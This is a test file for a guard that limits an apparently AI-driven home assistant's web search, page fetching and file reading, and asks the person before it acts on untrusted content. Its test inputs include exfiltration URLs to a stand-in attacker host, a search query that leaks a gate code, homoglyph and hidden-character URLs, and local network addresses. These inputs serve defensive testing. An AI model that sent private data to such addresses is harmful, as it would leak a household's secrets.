import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, test, vi } from "vitest";
import {
  BAD_CREDENTIALS, BAD_SEARCH, BAD_URL, createNativeGuard, HIDDEN_SEARCH, LONG_SEARCH, NOT_AVAILABLE, NOT_READABLE,
} from "../src/tools/native-guard.ts";
import { UNTRUSTED_REMINDER } from "../src/tools/untrusted.ts";
import { createTempDir, createTestTurn, KEVIN } from "./helpers.ts";

const CONV = "11111111-1111-4111-8111-111111111111";
const OTHER = "22222222-2222-4222-8222-222222222222";
const SIGNAL = new AbortController().signal;

/** A data folder (attachments, database) and a workspace whose .claude/ holds the skills and a settings file. */
function setup() {
  const root = createTempDir();
  const attachmentsDir = join(root, "data", "attachments", CONV);
  const otherDir = join(root, "data", "attachments", OTHER);
  const claudeDir = join(root, "workspace", ".claude");
  const skillsDir = join(claudeDir, "skills");
  for (const dir of [attachmentsDir, otherDir, join(skillsDir, "lire-un-document")]) mkdirSync(dir, { recursive: true });
  writeFileSync(join(attachmentsDir, "a.pdf"), "%PDF-1.7");
  writeFileSync(join(otherDir, "b.pdf"), "%PDF-1.7");
  writeFileSync(join(skillsDir, "lire-un-document", "SKILL.md"), "---\nname: lire-un-document\n---\n");
  writeFileSync(join(claudeDir, "settings.json"), "{}");
  writeFileSync(join(root, "data", "alicia.db"), "db");
  const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { attachmentsDir, skillsDir });
  return { guard: createNativeGuard(turn), turn, asked, root, attachmentsDir, otherDir, skillsDir, claudeDir };
}

describe("native guard", () => {
  test("WebSearch (trusted turn) and Skill are allowed; any other built-in tool is not", async () => {
    const { guard } = setup();
    expect(await guard.check("WebSearch", { query: "piscine" }, SIGNAL)).toEqual({ allow: true });
    expect(await guard.check("Skill", { skill: "lire-un-document" }, SIGNAL)).toEqual({ allow: true });
    for (const tool of ["Bash", "Write", "Edit", "Glob", "Grep", "Agent", "NotebookEdit", "mcp__other__x"]) {
      expect(await guard.check(tool, {}, SIGNAL), tool).toEqual({ allow: false, reason: NOT_AVAILABLE });
    }
  });

  test("Read: a skill file is allowed and the turn stays trusted", async () => {
    const { guard, turn, skillsDir } = setup();
    expect(await guard.check("Read", { file_path: join(skillsDir, "lire-un-document", "SKILL.md") }, SIGNAL)).toEqual({ allow: true });
    expect(turn.untrusted).toBe(false);
  });

  test("Read: this conversation's attachment is allowed, and the turn becomes untrusted", async () => {
    const { guard, turn, attachmentsDir } = setup();
    expect(await guard.check("Read", { file_path: join(attachmentsDir, "a.pdf"), pages: "1-3" }, SIGNAL)).toEqual({ allow: true });
    expect(turn.untrusted).toBe(true);
  });

  test("Read: anything else is refused (another conversation, the database, the settings beside the skills, bad input)", async () => {
    const { guard, turn, root, otherDir, claudeDir, skillsDir } = setup();
    for (const input of [
      { file_path: join(otherDir, "b.pdf") },
      { file_path: join(root, "data", "alicia.db") },
      { file_path: join(claudeDir, "settings.json") },
      { file_path: join(skillsDir, "..", "settings.json") },
      { file_path: skillsDir },
      { file_path: "SKILL.md" },
      { path: "x" },
      { file_path: 42 },
      "x",
      null,
    ]) {
      expect(await guard.check("Read", input, SIGNAL), JSON.stringify(input)).toEqual({ allow: false, reason: NOT_READABLE });
    }
    expect(turn.untrusted).toBe(false);
  });

  test("Read: a conversation without attachments reaches no attachment folder", async () => {
    const root = createTempDir();
    const { turn } = createTestTurn(KEVIN, CONV, "refused", {
      attachmentsDir: join(root, "attachments", CONV), skillsDir: join(root, "skills"),
    });
    const guard = createNativeGuard(turn);
    expect(await guard.check("Read", { file_path: join(root, "attachments", CONV, "a.pdf") }, SIGNAL))
      .toEqual({ allow: false, reason: NOT_READABLE });
  });
});

const SEARCH = (query: string) => ({ query });
const REFUSED_SEARCH = "Recherche non faite : la personne a refusé. Ne réessaie pas sans qu'elle le demande.";

describe("WebSearch", () => {
  test("trusted turn: searches freely; its results are outside text, so the turn becomes untrusted", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
    expect(await createNativeGuard(turn).check("WebSearch", SEARCH("horaires piscine Lyon"), SIGNAL)).toEqual({ allow: true });
    expect(asked).toEqual([]);
    expect(turn.untrusted).toBe(true);
  });

  test("the result addresses may then be opened without asking; any other address asks", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
    const guard = createNativeGuard(turn);
    await guard.check("WebSearch", SEARCH("piscine Lyon"), SIGNAL);
    const response = {
      query: "piscine Lyon",
      results: [
        "Voici les résultats.",
        { tool_use_id: "s1", content: [{ title: "Piscines", url: "https://www.lyon.fr/piscines/" }, { title: "x", url: "javascript:alert(1)" }] },
      ],
      durationSeconds: 1,
    };
    expect(guard.after("WebSearch", SEARCH("piscine Lyon"), response)).toBe(UNTRUSTED_REMINDER);
    expect(await guard.check("WebFetch", FETCH("https://www.lyon.fr/piscines"), SIGNAL)).toEqual({ allow: true });
    expect(asked).toEqual([]);
    expect(await guard.check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: REFUSED_FETCH });
    expect(asked).toHaveLength(1);
  });

  test("an unexpected search response adds no address, but still reminds", () => {
    const { turn } = createTestTurn(KEVIN, CONV, "refused");
    const guard = createNativeGuard(turn);
    for (const response of [undefined, "texte", { results: "x" }, { results: [{ content: [{ url: 42 }] }] }]) {
      expect(guard.after("WebSearch", SEARCH("x"), response)).toBe(UNTRUSTED_REMINDER);
    }
    expect(turn.untrusted).toBe(true);
  });

  test("untrusted turn: the search asks first, showing the query; no → refused", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
    turn.markUntrusted();
    const query = "souvenirs de Kévin : code du portail 4521";
    expect(await createNativeGuard(turn).check("WebSearch", { ...SEARCH(query), allowed_domains: ["evil.example"] }, SIGNAL))
      .toEqual({ allow: false, reason: REFUSED_SEARCH });
    expect(asked).toHaveLength(1);
    expect(asked[0]?.tool).toBe("WebSearch");
    expect(asked[0]?.summary.startsWith(`Chercher sur le web : “${query}” ?`)).toBe(true);
  });

  test("untrusted turn: yes → allowed", async () => {
    const { turn } = createTestTurn(KEVIN, CONV, "approved");
    turn.markUntrusted();
    expect(await createNativeGuard(turn).check("WebSearch", SEARCH("piscine"), SIGNAL)).toEqual({ allow: true });
  });

  test("untrusted turn, no answer or turn over: refused", async () => {
    for (const [outcome, reason] of [
      ["expired", "Recherche non faite : pas de réponse à la demande de confirmation."],
      ["cancelled", "Recherche non faite : demande de confirmation annulée."],
    ] as const) {
      const { turn } = createTestTurn(KEVIN, CONV, outcome);
      turn.markUntrusted();
      expect(await createNativeGuard(turn).check("WebSearch", SEARCH("piscine"), SIGNAL)).toEqual({ allow: false, reason });
    }
  });

  test("untrusted turn: the card shows the whole query on one line, or nothing is searched", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "approved", { untrusted: true });
    const guard = createNativeGuard(turn);
    expect(await guard.check("WebSearch", SEARCH("piscine\nLyon\r\n horaires"), SIGNAL)).toEqual({ allow: true });
    expect(asked[0]?.summary.startsWith("Chercher sur le web : “piscine Lyon horaires” ?")).toBe(true);
    // Invisible characters could carry data the person cannot see: refused, not hidden.
    expect(await guard.check("WebSearch", SEARCH("piscine\u200B\u200Clyon"), SIGNAL)).toEqual({ allow: false, reason: HIDDEN_SEARCH });
    expect(await guard.check("WebSearch", SEARCH(`piscine ${"a".repeat(450)}`), SIGNAL)).toEqual({ allow: false, reason: LONG_SEARCH });
    expect(asked).toHaveLength(1);
    // A trusted turn asks nothing, so nothing is checked.
    const trusted = createTestTurn(KEVIN, CONV, "refused");
    expect(await createNativeGuard(trusted.turn).check("WebSearch", SEARCH(`x\u200B${"a".repeat(450)}`), SIGNAL)).toEqual({ allow: true });
  });

  test("no query: refused without asking", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "approved");
    turn.markUntrusted();
    for (const input of [{}, { query: "" }, { query: "   " }, { query: 42 }, "x", null]) {
      expect(await createNativeGuard(turn).check("WebSearch", input, SIGNAL), JSON.stringify(input))
        .toEqual({ allow: false, reason: BAD_SEARCH });
    }
    expect(asked).toEqual([]);
  });
});

const FETCH = (url: string) => ({ url, prompt: "Résume" });
const REFUSED_FETCH = "Page non ouverte : la personne a refusé. Ne réessaie pas sans qu'elle le demande.";

describe("WebFetch", () => {
  test("trusted turn: any web page, no question; the page then makes the turn untrusted", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
    const guard = createNativeGuard(turn);
    expect(await guard.check("WebFetch", FETCH("https://example.com/a"), SIGNAL)).toEqual({ allow: true });
    expect(asked).toEqual([]);
    expect(turn.untrusted).toBe(true);
  });

  test("untrusted turn: an address from the person's message goes through", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { userText: "Regarde https://meteo.fr/paris" });
    turn.markUntrusted();
    expect(await createNativeGuard(turn).check("WebFetch", FETCH("https://meteo.fr/paris/"), SIGNAL)).toEqual({ allow: true });
    expect(asked).toEqual([]);
  });

  test("untrusted turn: any other address asks first; no → refused", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { userText: "Lis mon document https://meteo.fr/paris" });
    turn.markUntrusted();
    const guard = createNativeGuard(turn);
    for (const url of [
      "https://evil.example/?d=souvenirs",
      // Look-alikes of the person's address: other host, other query, longer path, extra slash.
      "https://meteo.fr.evil.example/paris",
      "https://meteo.fr/paris//",
      "https://meteo.fr/paris?d=souvenirs",
      "https://meteo.fr/paris/souvenirs",
    ]) {
      expect(await guard.check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: REFUSED_FETCH });
    }
    expect(asked).toHaveLength(5);
  });

  test("the card shows the site alone on its own line, then the full address (parsed, never hiding the site)", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { untrusted: true });
    const guard = createNativeGuard(turn);
    await guard.check("WebFetch", FETCH("https://аpple.com/\u202Egnp.exe?d=souvenirs"), SIGNAL);
    await guard.check("WebFetch", FETCH(`https://evil.example/${"a".repeat(600)}`), SIGNAL);
    const [homoglyph, long] = asked.map((a) => a.summary.split("\n"));
    expect(homoglyph?.[1]).toBe("xn--pple-43d.com");
    expect(homoglyph?.[2]).toBe("Adresse complète : https://xn--pple-43d.com/%E2%80%AEgnp.exe?d=souvenirs");
    expect(long?.[1]).toBe("evil.example");
    expect(asked[0]?.summary.split("\n")[0]).toBe("Ouvrir une page de ce site ?");
    for (const a of asked) expect(a.summary.length).toBeLessThanOrEqual(500);
  });

  test("an address carrying credentials is refused outright", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "approved", { userText: "https://meteo.fr@evil.example/paris" });
    for (const url of ["https://meteo.fr@evil.example/paris", "https://user:pass@example.com/"]) {
      expect(await createNativeGuard(turn).check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: BAD_CREDENTIALS });
    }
    expect(asked).toEqual([]);
  });

  test("a machine of the house always asks, even in a trusted turn and even from the person's message", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { userText: "Regarde http://192.168.1.1/admin" });
    const guard = createNativeGuard(turn);
    for (const url of ["http://192.168.1.1/admin", "http://localhost:8780/", "http://[fd00::1]/", "http://homeassistant:8123/", "http://box.local/"]) {
      expect(await guard.check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: REFUSED_FETCH });
    }
    expect(asked).toHaveLength(5);
    expect(asked[0]?.summary.split("\n")[0]).toBe("Ouvrir une adresse du réseau de la maison ?");
    expect(turn.untrusted).toBe(false);
  });

  test("a conversation that already let outside content in starts the turn untrusted", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { untrusted: true });
    expect(turn.untrusted).toBe(true);
    expect(await createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: REFUSED_FETCH });
    expect(asked).toHaveLength(1);
  });

  test("the question dies with the hook: its signal aborting cancels it", async () => {
    const { turn } = createTestTurn(KEVIN, CONV, (signal) => new Promise((resolve) => {
      signal.addEventListener("abort", () => { resolve("cancelled"); }, { once: true });
    }), { untrusted: true });
    const hook = new AbortController();
    const decision = createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), hook.signal);
    hook.abort();
    expect(await decision).toEqual({ allow: false, reason: "Page non ouverte : demande de confirmation annulée." });
  });

  test("a yes that arrives once the turn is over allows nothing", async () => {
    let end = (): void => undefined;
    const created = createTestTurn(KEVIN, CONV, () => {
      end();
      return Promise.resolve("approved");
    }, { untrusted: true });
    end = created.end;
    const guard = createNativeGuard(created.turn);
    expect(await guard.check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: "Page non ouverte : demande de confirmation annulée." });
    expect(await guard.check("WebSearch", SEARCH("x"), SIGNAL)).toEqual({ allow: false, reason: "Recherche non faite : demande de confirmation annulée." });
  });

  test("untrusted turn: yes → allowed", async () => {
    const { turn } = createTestTurn(KEVIN, CONV, "approved");
    turn.markUntrusted();
    expect(await createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: true });
  });

  test("untrusted turn, no answer or turn over: refused", async () => {
    for (const [outcome, reason] of [
      ["expired", "Page non ouverte : pas de réponse à la demande de confirmation."],
      ["cancelled", "Page non ouverte : demande de confirmation annulée."],
    ] as const) {
      const { turn } = createTestTurn(KEVIN, CONV, outcome);
      turn.markUntrusted();
      expect(await createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason });
    }
  });

  test("not a web address: refused without asking", async () => {
    const { turn, asked } = createTestTurn(KEVIN, CONV, "approved");
    for (const input of [FETCH("file:///C:/Windows/win.ini"), FETCH("javascript:alert(1)"), { prompt: "x" }, "x"]) {
      expect(await createNativeGuard(turn).check("WebFetch", input, SIGNAL)).toEqual({ allow: false, reason: BAD_URL });
    }
    expect(asked).toEqual([]);
  });

  test("reminder after WebFetch, a search and reading an attachment, not after a skill file", () => {
    const { guard, attachmentsDir, skillsDir } = setup();
    expect(guard.after("WebFetch", FETCH("https://example.com"), "page")).toBe(UNTRUSTED_REMINDER);
    expect(guard.after("Read", { file_path: join(attachmentsDir, "a.pdf") }, "x")).toBe(UNTRUSTED_REMINDER);
    expect(guard.after("Read", { file_path: join(skillsDir, "lire-un-document", "SKILL.md") }, "x")).toBeUndefined();
    expect(guard.after("Skill", { skill: "x" }, "x")).toBeUndefined();
  });
});

describe("TurnContext", () => {
  test("the first mark is passed on once (the conversation keeps it); a turn starting untrusted passes nothing", () => {
    let marks = 0;
    const { turn } = createTestTurn(KEVIN, CONV, "refused", { onUntrusted: () => { marks++; } });
    turn.markUntrusted();
    turn.markUntrusted();
    expect(marks).toBe(1);
    const already = createTestTurn(KEVIN, CONV, "refused", { untrusted: true, onUntrusted: () => { marks++; } }).turn;
    already.markUntrusted();
    expect(marks).toBe(1);
  });

  test("a failed write keeps the mark in the turn, and is tried again (next mark, end of turn)", () => {
    let failures = 2;
    let writes = 0;
    const errors = vi.spyOn(console, "error").mockImplementation(() => undefined);
    try {
      const { turn } = createTestTurn(KEVIN, CONV, "refused", {
        onUntrusted: () => {
          writes++;
          if (failures-- > 0) throw new Error("base verrouillée");
        },
      });
      turn.markUntrusted();
      expect(turn.untrusted).toBe(true);
      turn.markUntrusted();
      expect(writes).toBe(2);
      turn.persistUntrusted();
      expect(writes).toBe(3);
      turn.persistUntrusted();
      turn.markUntrusted();
      expect(writes).toBe(3);
      expect(errors).toHaveBeenCalledTimes(2);
    } finally {
      errors.mockRestore();
    }
  });

  test("search results still add their addresses and remind, even when the mark cannot be written", () => {
    const errors = vi.spyOn(console, "error").mockImplementation(() => undefined);
    try {
      const { turn } = createTestTurn(KEVIN, CONV, "refused", { onUntrusted: () => { throw new Error("base verrouillée"); } });
      const guard = createNativeGuard(turn);
      const response = { query: "x", results: [{ tool_use_id: "s", content: [{ title: "t", url: "https://www.lyon.fr/" }] }] };
      expect(guard.after("WebSearch", SEARCH("x"), response)).toBe(UNTRUSTED_REMINDER);
      expect(turn.knowsUrl("www.lyon.fr")).toBe(true);
      expect(turn.untrusted).toBe(true);
    } finally {
      errors.mockRestore();
    }
  });
});
